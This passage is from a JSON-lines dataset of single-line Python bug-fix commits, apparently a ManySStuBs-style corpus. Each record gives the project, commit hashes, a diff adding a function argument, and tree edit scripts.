\"N0\", [\"identifier:xml_graph_pre_process_step1\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "harpoon-2", "commit_sha": "6b10d65b79d02adadf76fa34e38ed2a819d52863", "parent_sha": "31cf57c81fdb6fad86fc9be104310799fdca82a1", "file_path": "harpoon/tasks.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def pull_all(overview, configuration, images, **kwargs):\n @a_task(needs_image=True)\n def make(overview, configuration, images, image):\n     \"\"\"Just create an image\"\"\"\n-    Builder().make_image(image)\n+    Builder().make_image(image, images)\n     print(\"Created image {0}\".format(image.image_name))\n \n @a_task(needs_images=True)\n", "before": "Builder ( ) . make_image ( image )", "after": "Builder ( ) . make_image ( image , images )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 32], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 25, 3, 32], [\"identifier:images\", \"T\"], 3]]"}
{"project": "harpoon-2", "commit_sha": "f3fe8d2728ab794bd2cdb6c34ad15272b9c64029", "parent_sha": "fddefeee108f2ac9eda2a5bc071f938c8ff6f089", "file_path": "harpoon/actions.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def pull_arbitrary(collector, image, **kwargs):\n     else:\n         image_indexes = [(image, image_index_of(image))]\n \n-    authentication = collector.configuration.get(\"authentication\")\n+    authentication = collector.configuration.get(\"authentication\", NotSpecified)\n     for index, (image, image_index) in enumerate(image_indexes):\n         image = {\n               \"image_name\": image\n", "before": "authentication = collector . configuration . get ( \"authentication\" )", "after": "authentication = collector . configuration . get ( \"authentication\" , NotSpecified )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 67], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 49, 3, 67], [\"identifier:NotSpecified\", \"T\"], 3]]"}
{"project": "snabb-api-backend", "commit_sha": "e18260c62aa996c38ea5c9078edacbab59b34180", "parent_sha": "7940f1094adec48236569d9946addf51468c7033", "file_path": "snabb/utils/setup_tests.py", "project_url": "https://github.com/SnabbHQ/snabb-api-backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ We use this library to setup all object creation, to use them accross our tests\n def create_profile():\n     profile = Profile.objects.get_or_create(\n         company_name='My Company S.L.', email='email@example.com',\n-        password='123456', phone='+34123456789', user_lang='es'\n+        password='123456', phone='+34123456789', user_lang='es', enterprise=True\n     )\n     return profile[0]\n \n", "before": "profile = Profile . objects . get_or_create ( company_name = 'My Company S.L.' , email = 'email@example.com' , password = '123456' , phone = '+34123456789' , user_lang = 'es' )", "after": "profile = Profile . objects . get_or_create ( company_name = 'My Company S.L.' , email = 'email@example.com' , password = '123456' , phone = '+34123456789' , user_lang = 'es' , enterprise = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 44, 4, 6], [\",:,\", \"T\"], 10], [\"Insert\", [\"argument_list\", 1, 44, 4, 6], [\"keyword_argument\", \"N0\"], 11], [\"Insert\", \"N0\", [\"identifier:enterprise\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "harpoon-2", "commit_sha": "4a1e0b1b945ffe49e49c6fb3269373f9802988e7", "parent_sha": "af4377e19f1100dbc97de454166873f2ceb84f71", "file_path": "harpoon/ship/builder.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -235,7 +235,7 @@ class Builder(object):\n             image_name = conf.image_name\n \n         context.close()\n-        for line in conf.harpoon.docker_context.build(fileobj=context.tmpfile, custom_context=True, tag=image_name, stream=True, rm=True):\n+        for line in conf.harpoon.docker_context.build(fileobj=context.tmpfile, custom_context=True, tag=image_name, stream=True, rm=True, pull=False):\n             try:\n                 stream.feed(line)\n             except Failure as error:\n", "before": "for line in conf . harpoon . docker_context . build ( fileobj = context . tmpfile , custom_context = True , tag = image_name , stream = True , rm = True ) : try : stream . feed ( line ) except Failure as error : ", "after": "for line in conf . harpoon . docker_context . build ( fileobj = context . tmpfile , custom_context = True , tag = image_name , stream = True , rm = True , pull = False ) : try : stream . feed ( line ) except Failure as error : ", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 54, 3, 138], [\",:,\", \"T\"], 10], [\"Insert\", [\"argument_list\", 3, 54, 3, 138], [\"keyword_argument\", \"N0\"], 11], [\"Insert\", \"N0\", [\"identifier:pull\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"false:False\", \"T\"], 2]]"}
{"project": "vnpy", "commit_sha": "e019a2bb3504dc7565ef2dbcd0530e8837970561", "parent_sha": "241808b45bd5fdfa70775fd63b029273914e5115", "file_path": "vn.trader/ctaEngine.py", "project_url": "https://github.com/gocome/vnpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class CtaEngine(object):\n             req.direction = DIRECTION_LONG\n             req.offset = OFFSET_CLOSE\n         \n-        vtOrderID = self.mainEngine.sendOrder(req)  # \u53d1\u5355\n+        vtOrderID = self.mainEngine.sendOrder(req, contract.gatewayName)    # \u53d1\u5355\n         self.orderDict[vtOrderID] = strategy        # \u4fdd\u5b58vtOrderID\u548c\u7b56\u7565\u7684\u6620\u5c04\u5173\u7cfb\n         return vtOrderID\n     \n", "before": "vtOrderID = self . mainEngine . sendOrder ( req )", "after": "vtOrderID = self . mainEngine . sendOrder ( req , contract . gatewayName )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 51], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 46, 3, 51], [\"attribute\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:contract\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:gatewayName\", \"T\"], 2]]"}
{"project": "Cura", "commit_sha": "2660b2a68f892dad154fdcbd034d90a402515ec7", "parent_sha": "a139809b75d956773f4a3164f7623a3acdd5ebd0", "file_path": "cura/ExtruderManager.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class ExtruderManager:\n \n         #Get the extruder definitions belonging to the current machine.\n         machine = self._global_container_stack.getBottom()\n-        extruder_train_ids = machine.getMetaDataEntry(\"machine_extruder_trains\")\n+        extruder_train_ids = machine.getMetaDataEntry(\"machine_extruder_trains\", { })\n         for _,extruder_train_id in extruder_train_ids.items():\n             extruder_definitions = UM.Settings.ContainerRegistry.getInstance().findDefinitionContainers(id = extruder_train_id) #Should be only 1 definition if IDs are unique, but add the whole list anyway.\n             if not extruder_definitions: #Empty list or error.\n", "before": "extruder_train_ids = machine . getMetaDataEntry ( \"machine_extruder_trains\" )", "after": "extruder_train_ids = machine . getMetaDataEntry ( \"machine_extruder_trains\" , { } )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 54, 3, 81], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 54, 3, 81], [\"dictionary\", \"N0\"], 3], [\"Insert\", \"N0\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N0\", [\"}:}\", \"T\"], 1]]"}
{"project": "pydbus", "commit_sha": "b8e91b2fb77f4d76cafa51a23b259ce1020d1e75", "parent_sha": "7da960163f420a35a3ae905d25d0f32ed0bea974", "file_path": "pydbus/bus.py", "project_url": "https://github.com/acaso/pydbus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ class Bus(OwnMixin, WatchMixin):\n \tType = Gio.BusType\n \n \tdef __init__(self, type:Type, timeout=10):\n-\t\tself.con = Gio.bus_get_sync(type)\n+\t\tself.con = Gio.bus_get_sync(type, None)\n \t\tself.timeout = timeout\n \n \tdef get(self, bus_name, object_path=None):\n", "before": "self . con = Gio . bus_get_sync ( type )", "after": "self . con = Gio . bus_get_sync ( type , None )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\"none:None\", \"T\"], 3]]"}
{"project": "scipy", "commit_sha": "4d97b0fa2a285e92d8fccd3eb7546f17b839938e", "parent_sha": "cc7f2c3e2d0b085771f32f7e9db24cd8559fceb5", "file_path": "scipy/optimize/tests/test_least_squares.py", "project_url": "https://github.com/bmorris3/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -540,7 +540,7 @@ class LossFunctionMixin(object):\n         for loss in LOSSES:\n             res = least_squares(fun_trivial, 2.0, loss=loss,\n                                 method=self.method)\n-            assert_allclose(res.x, 0)\n+            assert_allclose(res.x, 0, atol=1e-15)\n \n         assert_raises(ValueError, least_squares, fun_trivial, 2.0,\n                       loss='hinge', method=self.method)\n", "before": "assert_allclose ( res . x , 0 )", "after": "assert_allclose ( res . x , 0 , atol = 1e-15 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 38], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 28, 3, 38], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:atol\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"float:1e-15\", \"T\"], 2]]"}
{"project": "RatticWeb", "commit_sha": "49ba6e270f7e52d972c569815ceceb7e53182875", "parent_sha": "fc1e4fcc3ebade847fbfc4884b2c809668971162", "file_path": "staff/views.py", "project_url": "https://github.com/efornal/RatticWeb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,7 +170,7 @@ def change_advice_by_user_and_group(request, user_id, group_id):\n         # Combined with a list of view from this user\n         Q(cred__group__in=groups, audittype__in=[CredAudit.CREDVIEW,\n             CredAudit.CREDPASSVIEW], user=user)\n-    ).order_by('time')\n+    ).order_by('time', 'id')\n \n     # Go through each entry in time order\n     tochange = []\n", "before": "order_by ( 'time' )", "after": "order_by ( 'time' , 'id' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 3, 23], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 15, 3, 23], [\"string:'id'\", \"T\"], 3]]"}
{"project": "flocker", "commit_sha": "ec0f3cd654d4a3d69adbc112151f6d93692033aa", "parent_sha": "3a96125077ecf0b6889874dbea013665ee7cff29", "file_path": "flocker/volume/filesystems/zfs.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -273,7 +273,7 @@ def _list_filesystems(reactor, pool):\n \n     def listed(output, pool):\n         for line in output.splitlines():\n-            name, mountpoint = line.split()\n+            name, mountpoint = line.split('\\t')\n             name = name[len(pool) + 1:]\n             if name:\n                 yield (name, mountpoint)\n", "before": "name , mountpoint = line . split ( )", "after": "name , mountpoint = line . split ( '\\t' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 44], [\"string:'\\\\t'\", \"T\"], 1]]"}
{"project": "flocker", "commit_sha": "63cfe099963fc4902c170a53ad023cf08e30ff14", "parent_sha": "0ea845a92b5107215403d7991f7c243a4648eb95", "file_path": "flocker/testtools/__init__.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -619,7 +619,7 @@ class DockerImageBuilder(PRecord):\n         run_process(command)\n         if self.cleanup:\n             def remove_image():\n-                client = DockerClient()\n+                client = DockerClient(version=\"1.15\")\n                 for container in client.containers():\n                     if container[u\"Image\"] == tag + \":latest\":\n                         client.remove_container(container[u\"Names\"][0])\n", "before": "client = DockerClient ( )", "after": "client = DockerClient ( version = \"1.15\" )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 40], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:version\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:\\\"1.15\\\"\", \"T\"], 2]]"}
{"project": "flocker", "commit_sha": "7deb11ed2dcdf2aae2101e2fc7342832c2dadedc", "parent_sha": "127a37f49f3c5481dbca4877a32af96b8d7baab3", "file_path": "flocker/cli/functional/test_deploy_script.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ class FlockerDeployTests(TestCase):\n         self.persistence_service = ConfigurationPersistenceService(\n             reactor, FilePath(self.mktemp()))\n         self.persistence_service.startService()\n-        self.cluster_state_service = ClusterStateService()\n+        self.cluster_state_service = ClusterStateService(reactor)\n         self.cluster_state_service.startService()\n         self.cluster_state_service.apply_changes(\n             [NodeState(uuid=uuid4(), hostname=ip)\n", "before": "self . cluster_state_service = ClusterStateService ( )", "after": "self . cluster_state_service = ClusterStateService ( reactor )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 57, 3, 59], [\"identifier:reactor\", \"T\"], 1]]"}
{"project": "flocker", "commit_sha": "918bfb07706576f6cb54b2fbee43568b4b354cca", "parent_sha": "0d6c89b486f54d8f2c003d686b9b2ee41bca5ad6", "file_path": "flocker/control/test/test_httpapi.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2631,7 +2631,7 @@ class CreateAPIServiceTests(SynchronousTestCase):\n         endpoint = TCP4ServerEndpoint(reactor, 6789)\n         verifyObject(IService, create_api_service(\n             ConfigurationPersistenceService(reactor, FilePath(self.mktemp())),\n-            ClusterStateService(), endpoint, ClientContextFactory()))\n+            ClusterStateService(reactor), endpoint, ClientContextFactory()))\n \n \n class DatasetsStateTestsMixin(APITestsMixin):\n", "before": "verifyObject ( IService , create_api_service ( ConfigurationPersistenceService ( reactor , FilePath ( self . mktemp ( ) ) ) , ClusterStateService ( ) , endpoint , ClientContextFactory ( ) ) )", "after": "verifyObject ( IService , create_api_service ( ConfigurationPersistenceService ( reactor , FilePath ( self . mktemp ( ) ) ) , ClusterStateService ( reactor ) , endpoint , ClientContextFactory ( ) ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 34], [\"identifier:reactor\", \"T\"], 1]]"}
{"project": "beets", "commit_sha": "422a7f6063a9a9831cdb21fa3860d3b65682cea6", "parent_sha": "974155f2bcd91ea3eae222990d96e3d4d5879e67", "file_path": "beetsplug/replaygain.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -628,7 +628,7 @@ class ReplayGainPlugin(BeetsPlugin):\n \n         try:\n             self.backend_instance = self.backends[backend_name](\n-                self.config\n+                self.config, self._log\n             )\n         except (ReplayGainError, FatalReplayGainError) as e:\n             raise ui.UserError(\n", "before": "self . backend_instance = self . backends [ backend_name ] ( self . config )", "after": "self . backend_instance = self . backends [ backend_name ] ( self . config , self . _log )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 64, 4, 14], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 2, 64, 4, 14], [\"attribute\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_log\", \"T\"], 2]]"}
{"project": "PornHub.bundle", "commit_sha": "68c372230a8abcf65f7e640466430b80edf06aad", "parent_sha": "ce256e64102a8aedbe4a85230bb113a139b9f72f", "file_path": "Contents/Code/PHCommon.py", "project_url": "https://github.com/dterracino/PornHub.bundle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ def ListVideos(title=L(\"DefaultListVideosTitle\"), url=PH_VIDEO_URL, page=1, page\n \t# There is a slight change that this will break... If the number of videos returned in total is divisible by MAX_VIDEOS_PER_PAGE with no remainder, there could possibly be no additional page after. This is unlikely though and I'm too lazy to handle it.\n \tif (len(videos) == int(pageLimit)):\n \t\toc.add(NextPageObject(\n-\t\t\tkey =\tCallback(ListVideos, title=title, url=url, page = int(page)+1),\n+\t\t\tkey =\tCallback(ListVideos, title=title, url=url, page = int(page)+1, pageLimit=int(pageLimit)),\n \t\t\ttitle =\t'Next Page'\n \t\t))\n \n", "before": "oc . add ( NextPageObject ( key = Callback ( ListVideos , title = title , url = url , page = int ( page ) + 1 ) , title = 'Next Page' ) )", "after": "oc . add ( NextPageObject ( key = Callback ( ListVideos , title = title , url = url , page = int ( page ) + 1 , pageLimit = int ( pageLimit ) ) , title = 'Next Page' ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 72], [\",:,\", \"T\"], 8], [\"Insert\", [\"argument_list\", 3, 18, 3, 72], [\"keyword_argument\", \"N0\"], 9], [\"Insert\", [\"argument_list\", 3, 18, 3, 72], [\"):)\", \"T\"], 10], [\"Insert\", \"N0\", [\"identifier:pageLimit\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:pageLimit\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 71, 3, 72], 2]]"}
{"project": "flocker", "commit_sha": "f030d004e1bdd186a010c52012d6db8979374332", "parent_sha": "3908f8fcf0345c6ebfafe840eff14c08ae92f199", "file_path": "flocker/node/agents/ebs.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,7 +283,7 @@ class VolumeBusy(Exception):\n     def __init__(self, volume):\n-        Exception.__init__(volume.id, volume.attachments)\n+        Exception.__init__(self, volume.id, volume.attachments)\n \n \n class InvalidRegionError(Exception):\n", "before": "Exception . __init__ ( volume . id , volume . attachments )", "after": "Exception . __init__ ( self , volume . id , volume . attachments )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 27, 1, 58], [\"identifier:self\", \"T\"], 1], [\"Insert\", [\"argument_list\", 1, 27, 1, 58], [\",:,\", \"T\"], 2]]"}
{"project": "flocker", "commit_sha": "46478888abb6475a2aed8fd7cf0caa8bfcfb1ec1", "parent_sha": "178d84b1814421bd3190074efa67d9c51eba39d2", "file_path": "benchmark/cluster_containers_setup.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -316,7 +316,7 @@ class ClusterContainerDeployment(object):\n \n             def update_error_count(failure):\n                 self.error_count += 1\n-                failure.printTraceback()\n+                failure.printTraceback(sys.stderr)\n                 write_failure(failure)\n \n             d.addCallbacks(update_container_count, update_error_count)\n", "before": "failure . printTraceback ( )", "after": "failure . printTraceback ( sys . stderr )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 41], [\"attribute\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:stderr\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "336bb9255ced0693d1c2b990caf831823a84f562", "parent_sha": "14ce6a557e2a4d30d07a57e65c2410ec8c77a0a8", "file_path": "beetsplug/chroma.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -240,7 +240,7 @@ def submit_items(log, userkey, items, chunksize=64):\n         del data[:]\n \n     for item in items:\n-        fp = fingerprint_item(item)\n+        fp = fingerprint_item(log, item)\n \n         # Construct a submission dictionary for this item.\n         item_data = {\n", "before": "fp = fingerprint_item ( item )", "after": "fp = fingerprint_item ( log , item )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\"identifier:log\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\",:,\", \"T\"], 2]]"}
{"project": "morpion_aveugle_EA", "commit_sha": "61642641ceb7315a0ec76aaaa978b58aad02fd6f", "parent_sha": "9e30f2b594cbf83897cdf9912fae11dd0f9e2fb8", "file_path": "main_reseau.py", "project_url": "https://github.com/Apodeus/morpion_aveugle_EA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -416,6 +416,6 @@ def main():\n \telse:\n \t\tip = sys.argv[1]\n \t\tport = 7777\n-\t\tmain_client()\n+\t\tmain_client(ip, port)\n \n main()\n", "before": "main_client ( )", "after": "main_client ( ip , port )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 16], [\"identifier:ip\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 14, 3, 16], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 14, 3, 16], [\"identifier:port\", \"T\"], 3]]"}
{"project": "Sublimall", "commit_sha": "8ddcfd7c447b8a7535d77513160a49c34248ba40", "parent_sha": "8319c9cef2abc1e4024c606059e9f2d6cb9ffccb", "file_path": "sublimall/blacklist.py", "project_url": "https://github.com/alsibir/Sublimall", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,6 +14,6 @@ installed_packages = [\n def get_ignored_packages():\n     __settings = sublime.load_settings(SETTINGS_USER_FILE)\n     custom_packages = []\n-    for ignored_package in __settings.get('ignore_packages'):\n+    for ignored_package in __settings.get('ignore_packages', []):\n         custom_packages.append(ignored_package)\n     return custom_packages\n", "before": "for ignored_package in __settings . get ( 'ignore_packages' ) : custom_packages . append ( ignored_package )", "after": "for ignored_package in __settings . get ( 'ignore_packages' , [ ] ) : custom_packages . append ( ignored_package )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"list\", \"N0\"], 3], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 1]]"}
{"project": "weewx", "commit_sha": "e4f282af7d0853d7b6c04a282edb3da69bc9cb64", "parent_sha": "eb487a0d3e65a6250b53a62a7ad751ea52e76bc0", "file_path": "bin/weewx/imagegenerator.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class ImageGenerator(weewx.reportengine.CachedReportGenerator):\n                 plot.setXScaling((minstamp, maxstamp, timeinc))\n                 \n                 # Set the y-scaling, using any user-supplied hints: \n-                plot.setYScaling(weeutil.weeutil.convertToFloat(plot_options.get('yscale')))\n+                plot.setYScaling(weeutil.weeutil.convertToFloat(plot_options.get('yscale', ['None', 'None', 'None'])))\n                 \n                 # Get a suitable bottom label:\n                 bottom_label_format = plot_options.get('bottom_label_format', '%m/%d/%y %H:%M')\n", "before": "plot . setYScaling ( weeutil . weeutil . convertToFloat ( plot_options . get ( 'yscale' ) ) )", "after": "plot . setYScaling ( weeutil . weeutil . convertToFloat ( plot_options . get ( 'yscale' , [ 'None' , 'None' , 'None' ] ) ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 81, 3, 91], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 81, 3, 91], [\"list\", \"N0\"], 3], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'None'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'None'\", \"T\"], 3], [\"Insert\", \"N0\", [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"string:'None'\", \"T\"], 5], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 6]]"}
{"project": "larray", "commit_sha": "5d821e9141a92b50bf565a23bc04ddcb43025073", "parent_sha": "7b8cdba3b69c2426e8b6da361691be7ef5298e54", "file_path": "larray/core.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2511,7 +2511,7 @@ class LArray(object):\n                                  \"specified for argsort\")\n             axis = self.axes[0]\n         axis, axis_idx = self.axes[axis], self.axes.index(axis)\n-        return LArray(self.data.argsort(axis_idx), self.axes)\n+        return LArray(self.data.argsort(axis_idx, kind=kind), self.axes)\n \n     def copy(self):\n         return LArray(self.data.copy(), axes=self.axes[:])\n", "before": "return LArray ( self . data . argsort ( axis_idx ) , self . axes )", "after": "return LArray ( self . data . argsort ( axis_idx , kind = kind ) , self . axes )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 50], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 40, 3, 50], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:kind\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:kind\", \"T\"], 2]]"}
{"project": "larray", "commit_sha": "c6504f5f8f94bcad7b649187e42479b0aee2be26", "parent_sha": "7051dc7d54a9294d93ae955b3bdfe2538cf65d1f", "file_path": "larray/core.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4234,7 +4234,7 @@ class LArray(object):\n-        return LArray(self.data, axes)\n+        return LArray(self.data, axes, self.title)\n \n     def __getattr__(self, key):\n         try:\n", "before": "return LArray ( self . data , axes )", "after": "return LArray ( self . data , axes , self . title )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 22, 0, 39], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 0, 22, 0, 39], [\"attribute\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:title\", \"T\"], 2]]"}
{"project": "larray", "commit_sha": "329b4b948ab9a9c4282f09df538342e84aab8c38", "parent_sha": "e9919c30a2a61f23f1a910fb2bec36e3a7c2922b", "file_path": "larray/tests/test_array.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2646,7 +2646,7 @@ def test_extend(small_array):\n \n \n def test_hdf_roundtrip(tmpdir, meta):\n-    a = ndtest((2, 3))\n+    a = ndtest((2, 3), meta=meta)\n     fpath = tmp_path(tmpdir, 'test.h5')\n     a.to_hdf(fpath, 'a')\n     res = read_hdf(fpath, 'a')\n", "before": "a = ndtest ( ( 2 , 3 ) )", "after": "a = ndtest ( ( 2 , 3 ) , meta = meta )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 3, 23], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 15, 3, 23], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:meta\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:meta\", \"T\"], 2]]"}
{"project": "spaCy", "commit_sha": "caff4638c986411c2c7b6de0230fd53fa862cad3", "parent_sha": "a510858f5a516447fa050223fe27773f4c55fa79", "file_path": "tests/website/test_api.py", "project_url": "https://github.com/CompanyBook/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def test_read_bytes(nlp):\n         file_.write(nlp(u'This is a document.').to_bytes())\n         file_.write(nlp(u'This is another.').to_bytes())\n     docs = []\n-    with open(loc) as file_:\n+    with open(loc, 'rb') as file_:\n         for byte_string in Doc.read_bytes(file_):\n             docs.append(Doc(nlp.vocab).from_bytes(byte_string))\n     assert len(docs) == 2\n", "before": "with open ( loc ) as file_ : for byte_string in Doc . read_bytes ( file_ ) : docs . append ( Doc ( nlp . vocab ) . from_bytes ( byte_string ) )", "after": "with open ( loc , 'rb' ) as file_ : for byte_string in Doc . read_bytes ( file_ ) : docs . append ( Doc ( nlp . vocab ) . from_bytes ( byte_string ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", 